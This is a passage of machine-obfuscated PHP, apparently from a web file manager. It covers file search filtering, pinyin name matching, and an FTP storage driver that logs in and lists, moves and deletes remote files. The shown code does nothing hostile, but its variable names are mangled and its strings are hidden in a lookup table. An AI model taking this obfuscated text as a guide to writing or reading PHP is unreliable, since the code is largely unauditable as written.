$ÆèËÎ³ß[$ÖëÙ®Ü‰[1951]] . $ÖëÙ®Ü‰[1953])); $¥³•À© = !1; if ($¥³•À©) { $ú›«İØ’ = $this->listSearchChildren($ÆèËÎ³ß[$ÖëÙ®Ü‰[432]]); $ú›«İØ’ = array_unique($ú›«İØ’); if (!$ú›«İØ’) { return; } $ôÍÚª¨[$ÖëÙ®Ü‰[402]] = array($ÖëÙ®Ü‰[7], $ú›«İØ’); } $‹Ë©–ê¶ = Model($ÖëÙ®Ü‰[569])->field($ÖëÙ®Ü‰[402])->where($ôÍÚª¨)->limit(5000)->select(); $×¨Ì½­Ö = array_to_keyvalue($‹Ë©–ê¶, $ÖëÙ®Ü‰[12], $ÖëÙ®Ü‰[402]); $this->_listSearchMerge($Ğº÷Ø™ı, $ÆèËÎ³ß, $¢˜¡¿äÊ, $×¨Ì½­Ö); } private function _listSearchGroupTag(&$ÙÎ­ú´•, $µÉĞš¿€, $‡„•ÇİÅ) { $ÇÚ„ôğ =& $_SERVER[Ì¥ŞÒ°£]; if (!$µÉĞš¿€[$ÇÚ„ôğ[1951]] || $ÙÎ­ú´•[$ÇÚ„ôğ[366]][$ÇÚ„ôğ[353]] > 1 || !$µÉĞš¿€[$ÇÚ„ôğ[432]]) { return; } $•¬ù•Ş› = $this->sourceInfo($µÉĞš¿€[$ÇÚ„ôğ[432]]); if (!$•¬ù•Ş› || $•¬ù•Ş›[$ÇÚ„ôğ[411]] != SourceModel::TYPE_GROUP) { return; } $„âîÈ½ã = $•¬ù•Ş›[$ÇÚ„ôğ[505]]; $¾š üû­ = Model($ÇÚ„ôğ[2113])->get($„âîÈ½ã); $—Şı»±´ = array(); $‡­‘Æì = $µÉĞš¿€[$ÇÚ„ôğ[1951]]; foreach ($¾š üû­[$ÇÚ„ôğ[369]] as $õ¨œÏ‹Ç) { $¿åÁÏş = $õ¨œÏ‹Ç[$ÇÚ„ôğ[32]]; $Ü“”×É = str_replace($ÇÚ„ôğ[53], $ÇÚ„ôğ[12], Pinyin::get($¿åÁÏş)); if (stripos($¿åÁÏş, $‡­‘Æì) !== !1 || stripos($Ü“”×É, $‡­‘Æì) !== !1) { $—Şı»±´[] = $õ¨œÏ‹Ç[$ÇÚ„ôğ[399]]; } } if (!$—Şı»±´) { return; } $š÷šúÎö = array($ÇÚ„ôğ[426] => array($ÇÚ„ôğ[7], $—Şı»±´), $ÇÚ„ôğ[1667] => 0, $ÇÚ„ôğ[33] => $ÇÚ„ôğ[1973] . $„âîÈ½ã); $£ôé¼ù¥ = Model($ÇÚ„ôğ[428])->field($ÇÚ„ôğ[84])->where($š÷šúÎö)->select(); $£ôé¼ù¥ = array_to_keyvalue($£ôé¼ù¥, $ÇÚ„ôğ[12], $ÇÚ„ôğ[84]); $¥œÛÕÎ¨ = array_unique($£ôé¼ù¥); $this->_listSearchMerge($ÙÎ­ú´•, $µÉĞš¿€, $‡„•ÇİÅ, $¥œÛÕÎ¨); } private function _listSearchMerge(&$€ªçØŒÊ, $«½œÄ, $à ‘ ¡Ç, $¹Èóèî¨) { $ÒŒÇëÜ =& $_SERVER[Ì¥ŞÒ°£]; if (!$¹Èóèî¨) { return; } $…§±‰± = array_to_keyvalue($€ªçØŒÊ[$ÒŒÇëÜ[369]], $ÒŒÇëÜ[12], $ÒŒÇëÜ[402]); $ç‘¥§óË = array_diff($¹Èóèî¨, $…§±‰±); if (!$ç‘¥§óË) { return; } $›×ˆíåç = array($ÒŒÇëÜ[402] => array($ÒŒÇëÜ[7], $ç‘¥§óË)); $ûàÒíõ… = $this->field($à ‘ ¡Ç)->where($›×ˆíåç)->select(); if (!$ûàÒíõ…) { return; } $¨¼Ÿ² = array(); foreach ($ûàÒíõ… as $’ë¸ı) { if ($this->_listSearchFilter($’ë¸ı, $«½œÄ)) { $¨¼Ÿ²[] = $’ë¸ı; } } $€ªçØŒÊ[$ÒŒÇëÜ[369]] = array_merge($¨¼Ÿ², $€ªçØŒÊ[$ÒŒÇëÜ[369]]); $€ªçØŒÊ[$ÒŒÇëÜ[366]][$ÒŒÇëÜ[367]] += count($¨¼Ÿ²); } private function _listSearchFilter($ÆëÂò®¤, $ ¬êà§) { $‚ÎÒıŠ =& $_SERVER[Ì¥ŞÒ°£]; $Šà¢Ëßì = $ÆëÂò®¤[$‚ÎÒıŠ[410]] == $‚ÎÒıŠ[88]; if (!strstr($ÆëÂò®¤[$‚ÎÒıŠ[521]], $‚ÎÒıŠ[50] . $ ¬êà§[$‚ÎÒıŠ[432]] . $‚ÎÒıŠ[50])) { return !1; } if (isset($ ¬êà§[$‚ÎÒıŠ[412]]) && $ ¬êà§[$‚ÎÒıŠ[412]] != $‚ÎÒıŠ[1912]) { if ($ ¬êà§[$‚ÎÒıŠ[412]] == $‚ÎÒıŠ[75] && !$Šà¢Ëßì) { return !1; } if ($ ¬êà§[$‚ÎÒıŠ[412]] != $‚ÎÒıŠ[75] && $Šà¢Ëßì) { return !1; } if (!strstr($ÆëÂò®¤[$‚ÎÒıŠ[174]], $‚ÎÒıŠ[50] . $ ¬êà§[$‚ÎÒıŠ[412]] . $‚ÎÒıŠ[50])) { return !1; } } if (isset($ ¬êà§[$‚ÎÒıŠ[2114]]) && $ ¬êà§[$‚ÎÒıŠ[2114]] < $ÆëÂò®¤[$‚ÎÒıŠ[76]]) { return !1; } if (isset($ ¬êà§[$‚ÎÒıŠ[2115]]) && $ ¬êà§[$‚ÎÒıŠ[2115]] > $ÆëÂò®¤[$‚ÎÒıŠ[76]]) { return !1; } if (isset($ ¬êà§[$‚ÎÒıŠ[600]]) && $ ¬êà§[$‚ÎÒıŠ[600]] != $ÆëÂò®¤[$‚ÎÒıŠ[456]]) { return !1; } return !0; } public function listSearchChildren($œØ¢˜ï¿, $æ›úÛ‚Í = 5000) { $öÜÓáÔâ =& $_SERVER[Ì¥ŞÒ°£]; $£´´™Í¹ = array(); $¶”Ñ´ß = $this->sourceInfo($œØ¢˜ï¿); $ªÄŞæ®’ = array($öÜÓáÔâ[521] => array($öÜÓáÔâ[383], $¶”Ñ´ß[$öÜÓáÔâ[521]] . $¶”Ñ´ß[$öÜÓáÔâ[402]] . $öÜÓáÔâ[551])); $ŸÄ¯¯× = $this->field($öÜÓáÔâ[76])->where($ªÄŞæ®’)->limit($æ›úÛ‚Í + 1)->select(); $¼º¶‹ãı = is_array($ŸÄ¯¯×) ? count($ŸÄ¯¯×) : 0; if ($¼º¶‹ãı > $æ›úÛ‚Í) { return $this->_listSearchChildrenNear($œØ¢˜ï¿, $æ›úÛ‚Í); } $½™ıòš³ = $this->field($öÜÓáÔâ[402])->where($ªÄŞæ®’)->select(); $£´´™Í¹ = array_to_keyvalue($½™ıòš³, $öÜÓáÔâ[12], $öÜÓáÔâ[402]); return $£´´™Í¹; } private function _listSearchChildrenNear($ôìª­ÜÖ, $™©Ïƒöâ) { $âøò…Êã =& $_SERVER[Ì¥ŞÒ°£]; $Ì«ùÖÉ® = array(); $±ÔÕ’ú = array($âøò…Êã[432] => $ôìª­ÜÖ); $Ûá âá£ = $this->field($âøò…Êã[2116])->where($±ÔÕ’ú)->select(); $Æ¾òÛ‚… = array_to_keyvalue(array_filter_by_field($Ûá âá£, $âøò…Êã[410], $âøò…Êã[88]), $âøò…Êã[12], $âøò…Êã[402]); $Ì«ùÖÉ® = array_merge($Ì«ùÖÉ®, array_to_keyvalue($Ûá âá£, $âøò…Êã[12], $âøò…Êã[402])); if (!$Æ¾òÛ‚…) { return $Ì«ùÖÉ®; } $±ÔÕ’ú = array($âøò…Êã[432] => array($âøò…Êã[7], $Æ¾òÛ‚…)); $Ûá âá£ = $this->field($âøò…Êã[2116])->where($±ÔÕ’ú)->limit($™©Ïƒöâ)->select(); $Ì«ùÖÉ® = array_merge($Ì«ùÖÉ®, array_to_keyvalue($Ûá âá£, $âøò…Êã[12], $âøò…Êã[402])); $Ì«ùÖÉ® = array_slice($Ì«ùÖÉ®, 0, $™©Ïƒöâ); return $Ì«ùÖÉ®; } private function _listSearchBindPinyin($§ƒªêÅ, &$ÀÒû››, &$Úª›Â¡µ) { $¿×öÎÆı =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($§ƒªêÅ[$¿×öÎÆı[1951]]) || !$§ƒªêÅ[$¿×öÎÆı[1951]]) { return; } if (!Input::check($§ƒªêÅ[$¿×öÎÆı[1951]], $¿×öÎÆı[318]) || strlen($§ƒªêÅ[$¿×öÎÆı[1951]]) < 2) { return; } $œÖÓÛÄê = "\x4c\x45\106\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\163\x6f\x75\162\143\x65\x5f\x6d\x65\x74\141\x20\155\145\164\x61\x20\157\156\x20\163\x6f\165\162\143\145\x2e\163\x6f\x75\162\143\145\111\x44\x20\75\40\x6d\145\x74\141\56\163\x6f\x75\162\x63\x65\111\x44"; $î„Ïõ½Ñ = array(); $Úª›Â¡µ = str_replace(array($¿×öÎÆı[231], $¿×öÎÆı[53], $¿×öÎÆı[2117]), $¿×öÎÆı[12], $Úª›Â¡µ); $Úª›Â¡µ = $¿×öÎÆı[438] . str_replace($¿×öÎÆı[50], $¿×öÎÆı[439], $Úª›Â¡µ); $Ñô®‚¤  = $ÀÒû››[$¿×öÎÆı[32]]; unset($ÀÒû››[$¿×öÎÆı[32]]); foreach ($ÀÒû›› as $¨¦€‘ª§ => $Ø“ãñøÂ) { $î„Ïõ½Ñ[$¿×öÎÆı[438] . $¨¦€‘ª§] = $Ø“ãñøÂ; } foreach ($Ñô®‚¤  as $Ú¦¥èÇ…) { $î„Ïõ½Ñ[] = array($¿×öÎÆı[443] => $Ú¦¥èÇ…, $¿×öÎÆı[1005] => $¿×öÎÆı[1955], array($¿×öÎÆı[2118] => $Ú¦¥èÇ…, $¿×öÎÆı[2119] => array($¿×öÎÆı[7], array($¿×öÎÆı[465], $¿×öÎÆı[464])))); } $this->join($œÖÓÛÄê); $ÀÒû›› = $î„Ïõ½Ñ; } private function _parseSearchWhere($ˆÙÌ¢¿Â) { $èøÉ­Óù =& $_SERVER[Ì¥ŞÒ°£]; $°àì”æÎ = array(); if (isset($ˆÙÌ¢¿Â[$èøÉ­Óù[763]]) && $ˆÙÌ¢¿Â[$èøÉ­Óù[763]]) { $°àì”æÎ[$èøÉ­Óù[85]] = array($èøÉ­Óù[2120], $ˆÙÌ¢¿Â[$èøÉ­Óù[763]]); } if (isset($ˆÙÌ¢¿Â[$èøÉ­Óù[497]]) && $ˆÙÌ¢¿Â[$èøÉ­Óù[497]]) { $æØëŒ–± = array($èøÉ­Óù[2121], $ˆÙÌ¢¿Â[$èøÉ­Óù[497]]); if ($°àì”æÎ[$èøÉ­Óù[85]]) { $°àì”æÎ[$èøÉ­Óù[85]] = array($°àì”æÎ[$èøÉ­Óù[85]], $æØëŒ–±, $èøÉ­Óù[2122]); } else { $°àì”æÎ[$èøÉ­Óù[85]] = $æØëŒ–±; } } if (isset($ˆÙÌ¢¿Â[$èøÉ­Óù[2114]]) && $ˆÙÌ¢¿Â[$èøÉ­Óù[2114]] > 0) { $°àì”æÎ[$èøÉ­Óù[76]] = array($èøÉ­Óù[2120], $ˆÙÌ¢¿Â[$èøÉ­Óù[2114]]); } if (isset($ˆÙÌ¢¿Â[$èøÉ­Óù[2115]]) && $ˆÙÌ¢¿Â[$èøÉ­Óù[2115]]) { $æØëŒ–± = array($èøÉ­Óù[2121], $ˆÙÌ¢¿Â[$èøÉ­Óù[2115]]); if ($°àì”æÎ[$èøÉ­Óù[76]]) { $°àì”æÎ[$èøÉ­Óù[76]] = array($°àì”æÎ[$èøÉ­Óù[76]], $æØëŒ–±, $èøÉ­Óù[2122]); } else { $°àì”æÎ[$èøÉ­Óù[76]] = $æØëŒ–±; } } if (isset($ˆÙÌ¢¿Â[$èøÉ­Óù[600]]) && $ˆÙÌ¢¿Â[$èøÉ­Óù[600]]) { $°àì”æÎ[] = array($èøÉ­Óù[456] => $ˆÙÌ¢¿Â[$èøÉ­Óù[600]], $èøÉ­Óù[454] => $ˆÙÌ¢¿Â[$èøÉ­Óù[600]], $èøÉ­Óù[1005] => $èøÉ­Óù[1955]); } if (isset($ˆÙÌ¢¿Â[$èøÉ­Óù[412]]) && $ˆÙÌ¢¿Â[$èøÉ­Óù[412]]) { $‰“´íï˜ = $ˆÙÌ¢¿Â[$èøÉ­Óù[412]]; if ($‰“´íï˜ == $èøÉ­Óù[75]) { $°àì”æÎ[$èøÉ­Óù[410]] = 1; } else { if ($‰“´íï˜ == $èøÉ­Óù[2123]) { $°àì”æÎ[$èøÉ­Óù[410]] = 0; } else { if ($‰“´íï˜) { $‰“´íï˜ = is_array($‰“´íï˜) ? $‰“´íï˜ : explode($èøÉ­Óù[50], $‰“´íï˜); $°àì”æÎ[$èøÉ­Óù[412]] = array($èøÉ­Óù[418], $‰“´íï˜); $°àì”æÎ[$èøÉ­Óù[410]] = 0; } } } } $this->_parseSearchParent($ˆÙÌ¢¿Â, $°àì”æÎ); if (isset($ˆÙÌ¢¿Â[$èøÉ­Óù[1951]]) && trim($ˆÙÌ¢¿Â[$èøÉ­Óù[1951]])) { $ì¤Ï¸± = trim($ˆÙÌ¢¿Â[$èøÉ­Óù[1951]]); $³ŠÜÙÒ¶ = explode($èøÉ­Óù[53], $ì¤Ï¸±); if (strlen($ì¤Ï¸±) > 2 && (substr($ì¤Ï¸±, 0, 1) == $èøÉ­Óù[118] && substr($ì¤Ï¸±, -1) == $èøÉ­Óù[118]) || substr($ì¤Ï¸±, 0, 1) == $èøÉ­Óù[58] && substr($ì¤Ï¸±, -1) == $èøÉ­Óù[58]) { $ì¤Ï¸± = substr($ì¤Ï¸±, 1, -1); $³ŠÜÙÒ¶ = array($ì¤Ï¸±); } $°àì”æÎ[$èøÉ­Óù[32]] = array(array($èøÉ­Óù[550], $èøÉ­Óù[1953] . $ì¤Ï¸± . $èøÉ­Óù[1953])); if (count($³ŠÜÙÒ¶) > 1) { $°àì”æÎ[$èøÉ­Óù[32]] = array(); foreach ($³ŠÜÙÒ¶ as $ƒšÑ§‹ş) { if (!trim($ƒšÑ§‹ş)) { continue; } $°àì”æÎ[$èøÉ­Óù[32]][] = array($èøÉ­Óù[550], $èøÉ­Óù[1953] . trim($ƒšÑ§‹ş) . $èøÉ­Óù[1953]); } } } return $°àì”æÎ; } private function _parseSearchParent($Ä”Ã²ò, &$ä¾î€•´) { $û‡†÷øú =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($Ä”Ã²ò[$û‡†÷øú[432]]) || !$Ä”Ã²ò[$û‡†÷øú[432]]) { return; } $•Ê†°›ñ = $this->pathInfo($Ä”Ã²ò[$û‡†÷øú[432]]); $äƒ–¹Ï = $•Ê†°›ñ[$û‡†÷øú[432]] . $û‡†÷øú[12] === $û‡†÷øú[197]; $±¿­¸˜ = $•Ê†°›ñ[$û‡†÷øú[411]] == $û‡†÷øú[515]; if ($•Ê†°›ñ[$û‡†÷øú[532]] == $û‡†÷øú[533]) { $•ÕÌÔ¦– = $this->sourceInfo($Ä”Ã²ò[$û‡†÷øú[432]]); $•Ê†°›ñ[$û‡†÷øú[521]] = $•ÕÌÔ¦–[$û‡†÷øú[521]]; } $ä¾î€•´[$û‡†÷øú[590]] = array($û‡†÷øú[550], $•Ê†°›ñ[$û‡†÷øú[521]] . $Ä”Ã²ò[$û‡†÷øú[432]] . $û‡†÷øú[551]); $‹õàå÷™ = isset($Ä”Ã²ò[$û‡†÷øú[1816]]) && in_array($û‡†÷øú[515], $Ä”Ã²ò[$û‡†÷øú[1816]]); if (!$‹õàå÷™ || !$±¿­¸˜ || !$äƒ–¹Ï || !$•Ê†°›ñ[$û‡†÷øú[413]]) { return; } if (!AuthModel::authCheckRoot($•Ê†°›ñ[$û‡†÷øú[413]][$û‡†÷øú[414]])) { return; } $Ğí©Úó = $•Ê†°›ñ[$û‡†÷øú[505]] . $û‡†÷øú[12]; if ($Ğí©Úó == $û‡†÷øú[88]) { unset($ä¾î€•´[$û‡†÷øú[590]]); $ä¾î€•´[$û‡†÷øú[411]] = self::TYPE_GROUP; return; } $–ËÃ¾“´ = Model($û‡†÷øú[522])->groupChildrenAll($Ğí©Úó); $—”Ñ¬ı = count($–ËÃ¾“´); if ($—”Ñ¬ı <= 1) { return; } $ò€¾¿“¶ = array($û‡†÷øú[432] => 0, $û‡†÷øú[411] => self::TYPE_GROUP, $û‡†÷øú[505] => array($û‡†÷øú[7], $–ËÃ¾“´)); $À§¡úõ = $this->field($û‡†÷øú[2124])->where($ò€¾¿“¶)->limit($—”Ñ¬ı)->select(); $ä¾î€•´[$û‡†÷øú[590]] = array(); foreach ($À§¡úõ as $ãŠ°«ÄŞ) { $ä¾î€•´[$û‡†÷øú[590]][] = array($û‡†÷øú[550], $û‡†÷øú[531] . $ãŠ°«ÄŞ[$û‡†÷øú[402]] . $û‡†÷øú[551]); } $ä¾î€•´[$û‡†÷øú[590]][] = $û‡†÷øú[1955]; } } $_file = $_SERVER[$_SERVER[Ì¥ŞÒ°£][915]]; goto aìŠíÖö±ğ; F††ß…´÷›: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($ğóƒÔ›¾) { parent::__construct(); if (count($ğóƒÔ›¾) > 0) { $this->_init($ğóƒÔ›¾); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¶Öé—ÆØ) { $Ÿ“µë– =& $_SERVER[Ì¥ŞÒ°£]; global $config; $this->appCharset = $config[$Ÿ“µë–[1378]]; $this->systemCharset = $config[$Ÿ“µë–[1379]]; if (isset($¶Öé—ÆØ[$Ÿ“µë–[1380]]) && $¶Öé—ÆØ[$Ÿ“µë–[1380]]) { $this->systemCharset = $¶Öé—ÆØ[$Ÿ“µë–[1380]]; } } public function iconvApp($óÕ–ıº÷) { return $this->iconvTo($óÕ–ıº÷, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÔïÖòà´) { return $this->iconvTo($ÔïÖòà´, $this->appCharset, $this->systemCharset); } public function getPathOuter($°¢æ³¿˜) { $·Ø»ÒÅ³ =& $_SERVER[Ì¥ŞÒ°£]; $§°‰ß‚Ø = $this->iconvApp($this->pathBase); $°¢æ³¿˜ = $this->iconvApp($°¢æ³¿˜); if (substr($§°‰ß‚Ø, 0, 2) == $·Ø»ÒÅ³[1381]) { $§°‰ß‚Ø = BASIC_PATH . substr($§°‰ß‚Ø, 2); } if (substr($°¢æ³¿˜, 0, 2) == $·Ø»ÒÅ³[1381]) { $°¢æ³¿˜ = BASIC_PATH . substr($°¢æ³¿˜, 2); } $§°‰ß‚Ø = KodIO::clear($§°‰ß‚Ø); $°¢æ³¿˜ = KodIO::clear($°¢æ³¿˜); $°¢æ³¿˜ = substr($°¢æ³¿˜, strlen($§°‰ß‚Ø)); if (empty($this->pathDriver)) { return $°¢æ³¿˜; } return $this->pathDriver . $·Ø»ÒÅ³[8] . ltrim($°¢æ³¿˜, $·Ø»ÒÅ³[8]); } private function _init($óœªÉ‰ô = array()) { $—©„ğñ® =& $_SERVER[Ì¥ŞÒ°£]; if (!function_exists($—©„ğñ®[1382])) { throw new Exception(LNG($—©„ğñ®[1383])); } $this->config = $óœªÉ‰ô; $this->charsetReset($óœªÉ‰ô); foreach ($óœªÉ‰ô as $§¡ôğù« => $è·Á¶á) { if (isset($this->{$§¡ôğù«})) { $this->{$§¡ôğù«} = $è·Á¶á; } } return $this->_login($óœªÉ‰ô); } private function _login($œÌ¾Ç¢Ü) { $£Ç„ŞšŒ =& $_SERVER[Ì¥ŞÒ°£]; static $ëÄûÁÜÚ = array(); $ïËÑÙ²Ş = md5(json_encode($œÌ¾Ç¢Ü)); if (isset($ëÄûÁÜÚ[$ïËÑÙ²Ş])) { foreach ($ëÄûÁÜÚ[$ïËÑÙ²Ş] as $ÓÀ¬¤ğÛ => $†İÜ„…Ç) { $this->{$ÓÀ¬¤ğÛ} = $†İÜ„…Ç; } return !0; } $‘åÙ½ = parse_url(trim($this->server, $£Ç„ŞšŒ[8])); $this->host = $‘åÙ½[$£Ç„ŞšŒ[181]]; $¡Ô™Ş«â = isset($‘åÙ½[$£Ç„ŞšŒ[180]]) && $‘åÙ½[$£Ç„ŞšŒ[180]] == $£Ç„ŞšŒ[1384] ? !0 : !1; $this->scheme = $¡Ô™Ş«â ? $£Ç„ŞšŒ[1385] : $£Ç„ŞšŒ[1386]; $this->port = isset($‘åÙ½[$£Ç„ŞšŒ[182]]) ? $‘åÙ½[$£Ç„ŞšŒ[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ÖçÂ‘á³ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $’æÒá ò = $this->pasv == $£Ç„ŞšŒ[88] ? !0 : !1; @ftp_pasv($this->connect, $’æÒá ò); $ëÄûÁÜÚ[$ïËÑÙ²Ş] = array($£Ç„ŞšŒ[1387] => $this->connect, $£Ç„ŞšŒ[181] => $this->host, $£Ç„ŞšŒ[180] => $this->scheme, $£Ç„ŞšŒ[182] => $this->port); return $ÖçÂ‘á³; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($¥ó»ò¾í, $¿â‡Ğ—Ğ = '', $äâèÕ’ = REPEAT_RENAME) { if ($this->setContent($¥ó»ò¾í, $¿â‡Ğ—Ğ)) { return $this->getPathOuter($¥ó»ò¾í); } return !1; } public function mkdir($úš•¾„², $ĞôÇá± = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $úš•¾„² = $this->iconvSystem($úš•¾„²); if ($this->_isFolder($úš•¾„²) || @ftp_mkdir($this->connect, $úš•¾„²)) { return $this->getPathOuter($úš•¾„²); } if (!$this->mkdir($this->pathFather($úš•¾„²))) { return !1; } if ($úš•¾„² = @ftp_mkdir($this->connect, $úš•¾„²)) { return $this->getPathOuter($úš•¾„²); } return !1; } public function copyFile($ÛÈå¸İÃ, $øÛºüáÔ) { if (!$this->_isconn()) { return !1; } $Ó©Ñ‰Â¬ = $this->pathThis($this->iconvSystem($ÛÈå¸İÃ)); $¯œë—Ñ = $this->tempFile($Ó©Ñ‰Â¬); $óíõ½¾Í = $this->iconvApp($¯œë—Ñ); $this->download($ÛÈå¸İÃ, $óíõ½¾Í); $™÷°‘ÁÎ = $this->upload($øÛºüáÔ, $óíõ½¾Í); $this->tempFileRemve($¯œë—Ñ); return $™÷°‘ÁÎ; } public function moveFile($ş¤¯†ĞÂ, $™ªï×İğ) { if (!$this->_isconn()) { return !1; } $ş¤¯†ĞÂ = $this->iconvSystem($ş¤¯†ĞÂ); $™ªï×İğ = $this->iconvSystem($™ªï×İğ); $ßïÖ …ù = @ftp_rename($this->connect, $ş¤¯†ĞÂ, $™ªï×İğ); return $ßïÖ …ù ? $this->getPathOuter($™ªï×İğ) : !1; } public function delFile($úĞã½û) { if (!$this->_isconn()) { return !1; } $úĞã½û = $this->iconvSystem($úĞã½û); return @ftp_delete($this->connect, $úĞã½û); } public function delFolder($ŠÚÇ²§í) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Æ¬òß•â = $é„éÌ®‘ = array(); $this->fileList($ŠÚÇ²§í, $Æ¬òß•â, $é„éÌ®‘, !0); $this->listItemCache = !0; foreach ($é„éÌ®‘ as $Ìôö¹êİ) { $æ–àÇÂ = $this->iconvSystem($Ìôö¹êİ[$_SERVER[Ì¥ŞÒ°£][32]]); $í´¿¤ = @ftp_delete($this->connect, $æ–àÇÂ); if (!$í´¿¤) { return !1; } } foreach ($Æ¬òß•â as $æ–àÇÂ) { $æ–àÇÂ = $this->iconvSystem($æ–àÇÂ); $í´¿¤ = @ftp_rmdir($this->connect, $æ–àÇÂ); if (!$í´¿¤) { return !1; } } $ŠÚÇ²§í = $this->iconvSystem($ŠÚÇ²§í); return @ftp_rmdir($this->connect, $ŠÚÇ²§í); } public function rename($“³û¥ÔÊ, $ÅÜæö¦Ó) { $©ÍüÅïü =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->_isconn()) { return !1; } $ƒÃ â•Î = $this->fileNameAuto($this->pathFather($“³û¥ÔÊ), $ÅÜæö¦Ó); $ƒÃ â•Î = $this->iconvSystem($ƒÃ â•Î); $“³û¥ÔÊ = $this->iconvSystem($“³û¥ÔÊ); $ëŒüş = $this->pathFather($“³û¥ÔÊ); $œÈ³ = rtrim($ëŒüş, $©ÍüÅïü[8]) . $©ÍüÅïü[8] . $ƒÃ â•Î; $ä„’¥ˆ = @ftp_rename($this->connect, $“³û¥ÔÊ, $œÈ³); $œÈ³ = $this->iconvApp($œÈ³); return $ä„’¥ˆ ? $this->getPathOuter($œÈ³) : !1; } private function folderInfo($¤ŠÊ‰óé, $—³µÅË« = false) { $Åã®×¼ğ =& $_SERVER[Ì¥ŞÒ°£]; $ô½®ˆàê = array($Åã®×¼ğ[32] => $this->pathThis($¤ŠÊ‰óé), $Åã®×¼ğ[84] => $this->getPathOuter($Åã®×¼ğ[8] . $¤ŠÊ‰óé), $Åã®×¼ğ[33] => $Åã®×¼ğ[75]); if ($—³µÅË«) { return $ô½®ˆàê; } $ô½®ˆàê[$Åã®×¼ğ[200]] = $ô½®ˆàê[$Åã®×¼ğ[85]] = 0; $ô½®ˆàê[$Åã®×¼ğ[201]] = $ô½®ˆàê[$Åã®×¼ğ[202]] = !0; return $ô½®ˆàê; } private function fileInfo($¤àâÓÖò, $ÈÏ¼Ú = false, $¢â¬Ä†½ = array()) { $ ›Ë‹±â =& $_SERVER[Ì¥ŞÒ°£]; $À®ÇæÑ¨ = array($ ›Ë‹±â[32] => $this->pathThis($¤àâÓÖò), $ ›Ë‹±â[84] => $this->getPathOuter($ ›Ë‹±â[8] . $¤àâÓÖò), $ ›Ë‹±â[33] => $ ›Ë‹±â[199], $ ›Ë‹±â[76] => isset($¢â¬Ä†½[$ ›Ë‹±â[76]]) ? $¢â¬Ä†½[$ ›Ë‹±â[76]] : 0, $ ›Ë‹±â[174] => $this->ext($¤àâÓÖò)); if ($ÈÏ¼Ú) { return $À®ÇæÑ¨; } $À®ÇæÑ¨[$ ›Ë‹±â[200]] = $À®ÇæÑ¨[$ ›Ë‹±â[85]] = 0; $À®ÇæÑ¨[$ ›Ë‹±â[201]] = $À®ÇæÑ¨[$ ›Ë‹±â[202]] = !0; $†Ø÷ùá¶ = $this->iconvSystem($¤àâÓÖò); $À®ÇæÑ¨[$ ›Ë‹±â[85]] = @ftp_mdtm($this->connect, $†Ø÷ùá¶); if (empty($¢â¬Ä†½)) { $¢â¬Ä†½ = $this->objectMeta($¤àâÓÖò); if (!$¢â¬Ä†½) { return $À®ÇæÑ¨; } } $À®ÇæÑ¨[$ ›Ë‹±â[76]] = $¢â¬Ä†½[$ ›Ë‹±â[76]]; return $À®ÇæÑ¨; } public function size($ï»¥˜Û) { $ÊÉ¶ÜË˜ = $this->objectMeta($ï»¥˜Û); return $ÊÉ¶ÜË˜ ? $ÊÉ¶ÜË˜[$_SERVER[Ì¥ŞÒ°£][76]] : 0; } public function info($º‰€ÈØº) { if ($this->isFile($º‰€ÈØº)) { return $this->fileInfo($º‰€ÈØº, 0); } else { if ($this->isFolder($º‰€ÈØº)) { return $this->folderInfo($º‰€ÈØº); } } return !1; } private function fileList($ëÜÅøøÂ, &$¼µÀ´¨İ, &$¬ƒÕ˜é›, $­¥…Ü¤… = false) { $„ÀÚ¾šö =& $_SERVER[Ì¥ŞÒ°£]; $ëÜÅøøÂ = $this->iconvSystem($ëÜÅøøÂ); if (!$this->isFolder($ëÜÅøøÂ)) { return !1; } @ftp_chdir($this->connect, $„ÀÚ¾šö[8]); $ëÜÅøøÂ = rtrim($ëÜÅøøÂ, $„ÀÚ¾šö[8]) . $„ÀÚ¾šö[8]; check_abort(); $³®ÍÈ®Ô = @ftp_rawlist($this->connect, $ëÜÅøøÂ); if (!$³®ÍÈ®Ô) { $³®ÍÈ®Ô = array(); } $¹Š›ÕøÓ = array($„ÀÚ¾šö[10] => 1, $„ÀÚ¾šö[1388] => 1); foreach ($³®ÍÈ®Ô as $ó±àğÖ) { $‹èÂï±Î = $this->_listItem($ó±àğÖ); if ($‹èÂï±Î[0] == $„ÀÚ¾šö[761]) { continue; } $«âÄ¨åÌ = $‹èÂï±Î[8]; if (empty($«âÄ¨åÌ) && $«âÄ¨åÌ !== $„ÀÚ¾šö[197] || isset($¹Š›ÕøÓ[$«âÄ¨åÌ])) { continue; } $«âÄ¨åÌ = $this->iconvApp($ëÜÅøøÂ . ltrim($«âÄ¨åÌ, $„ÀÚ¾šö[8])); $…ÜîşÍ = array($„ÀÚ¾šö[32] => $«âÄ¨åÌ, $„ÀÚ¾šö[33] => $„ÀÚ¾šö[199], $„ÀÚ¾šö[76] => $‹èÂï±Î[4]); if (substr($ó±àğÖ, 0, 1) == $„ÀÚ¾šö[1389]) { $…ÜîşÍ[$„ÀÚ¾šö[33]] = $„ÀÚ¾šö[75]; $…ÜîşÍ[$„ÀÚ¾šö[76]] = 0; } $’˜÷«Ä¸ = $…ÜîşÍ[$„ÀÚ¾šö[33]] == $„ÀÚ¾šö[75] ? !0 : !1; $this->cacheMethodInfoSet($«âÄ¨åÌ, $’˜÷«Ä¸, $…ÜîşÍ); if ($’˜÷«Ä¸) { $¼µÀ´¨İ[] = $«âÄ¨åÌ; if ($­¥…Ü¤…) { $this->fileList($«âÄ¨åÌ, $¼µÀ´¨İ, $¬ƒÕ˜é›, $­¥…Ü¤…); } continue; } $¬ƒÕ˜é›[] = $…ÜîşÍ; } 